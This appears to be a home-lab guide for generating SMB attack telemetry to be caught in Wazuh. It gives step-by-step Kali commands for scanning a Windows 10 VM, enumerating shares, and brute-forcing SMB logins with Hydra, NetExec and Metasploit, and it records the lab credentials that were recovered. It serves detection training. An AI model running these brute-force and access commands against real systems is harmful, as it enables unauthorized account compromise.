# 02 — Attack Simulation (Kali Linux step-by-step)

All commands run on **Kali — 192.168.100.107**. Copy-paste sheet also in `kali-commands.txt`.

## Step 1 — Reconnaissance: confirm the target and open ports

```bash
nmap -sS -sV -p 139,445,5985,3389 192.168.100.108
```
Expected: `445/tcp open microsoft-ds` (SMB). Port 3389 will be closed/filtered (Windows Home has no incoming RDP).

📸 **Screenshot:** `evidence/01-kali-nmap-scan.png` — nmap output showing 445 open.

## Step 2 — SMB enumeration (null session / guest)

```bash
# netexec (formerly crackmapexec) — identify OS, SMB signing, shares
netexec smb 192.168.100.108 -u '' -p '' --shares

# smbclient list shares as guest
smbclient -L //192.168.100.108 -U guest%

# (optional) SID brute-force to enumerate local user names
impacket-lookupsid guest@192.168.100.108
```
📸 **Screenshot:** `evidence/02-kali-smb-enum.png` — netexec showing the host name/OS.

## Step 3 — Brute force with Hydra (SMB protocol)

```bash
cd ~
hydra -L users.txt -P pass.txt smb://192.168.100.108 -t 4 -vV
```
- `-t 4` = 4 threads (keep it low to avoid missing events; 1 thread is fine for a lab)
- **LAB RESULT — Hydra FAILED against this target.** Windows 10 Home has SMBv1 disabled and enforces a modern SMB dialect; `hydra smb://` could not negotiate authentication and returned zero valid pairs (no success line). This is a **tooling limitation, not a hardening win** — the same credentials were guessed successfully by NetExec in Step 4. Lesson: if your first tool produces no telemetry at all (no 4625s), it's failing at the protocol layer, not at password guessing — switch tools before concluding the target is secure.
- Every wrong pair produces a 4625 on the target; valid pairs print success.

📸 **Screenshot:** `evidence/03-kali-hydra-brute-force.png` — Hydra output showing the SMB negotiation failure (no success line).

## Step 4 — Brute force with NetExec (the tool that succeeded — Hydra failed in Step 3)

```bash
netexec smb 192.168.100.108 -u users.txt -p pass.txt --continue-on-success
```
**Result (observed):** **41×`STATUS_LOGON_FAILURE`**. Two valid pairs returned: `jdoe:Password1` (first compromise) and `adminlab:P@ssw0rd` — the latter shows `(Pwn3d!)` because `adminlab` is a local administrator (ADMIN$ / C$ shares accessible). `mreyes` hit the lockout threshold (5 failures → 4740).

📸 **Screenshot:** `evidence/04-kali-netexec-brute-force.png` — failures + `(Pwn3d!)` success.

## Step 5 — Verify access with the stolen credential (post-bruteforce)

```bash
# confirm valid cred
netexec smb 192.168.100.108 -u adminlab -p 'P@ssw0rd'

# list shares
smbclient -L //192.168.100.108 -U adminlab%P@ssw0rd

# (optional) get an interactive SMB shell on ADMIN$ — proves admin access
impacket-smbclient adminlab:'P@ssw0rd'@192.168.100.108
```
📸 **Screenshot:** `evidence/05-kali-successful-access.png` — share listing as adminlab.

## Step 6 — (Optional) Metasploit smb_login module

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.100.108
set USER_FILE ~/users.txt
set PASS_FILE ~/pass.txt
set STOP_ON_SUCCESS true
run
```
📸 **Screenshot (if used):** `evidence/06-kali-metasploit-smb-login.png`

## Step 7 — Note the time

Write down the exact start/end time of the attack — you'll need it for `06-Timeline.md` and to filter Wazuh by time window.

## What NOT to do

- Don't brute-force from a machine with the Wazuh agent running (you'd pollute victim telemetry).
- Don't use 50+ threads — it can swamp the box and drop events; 1–4 threads is plenty.
- Don't forget the correct password at the end of the list — the `4624` success is the money shot.
